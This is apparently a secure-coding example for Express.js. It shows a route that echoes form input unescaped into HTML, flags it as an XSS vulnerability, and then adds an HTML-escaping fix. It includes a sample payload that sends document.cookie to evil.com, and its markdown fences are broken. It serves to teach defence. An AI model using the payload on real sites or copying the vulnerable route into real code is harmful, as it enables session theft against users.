const express = require('express');
const app = express();

app.use(express.urlencoded({ extended: true }));
app.use(express.json());

app.get('/', (req, res) => {
  res.send(`
    <form method="POST" action="/render">
      <input type="text" name="userInput" placeholder="Enter something..." />
      <button type="submit">Submit</button>
    </form>
  `);
});

// ⚠️ VULNERABLE: renders user input directly into HTML
app.post('/render', (req, res) => {
  const userInput = req.body.userInput;
  res.send(`<h1>You entered: ${userInput}</h1>`);
});

app.listen(3000, () => console.log('Server running on port 3000'));
```

---

⚠️ **This code has a critical XSS vulnerability.** Never do this in production.

If a user submits something like:
```
/*<script>document.location='https://evil.com?c='+document.cookie </script>*/

const escapeHtml = (str) =>
  str
    .replace(/&/g, '&amp;')
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;')
    .replace(/"/g, '&quot;')
    .replace(/'/g, '&#039;');

app.post('/render', (req, res) => {
  const userInput = escapeHtml(req.body.userInput);
  res.send(`<h1>You entered: ${userInput}</h1>`);
});




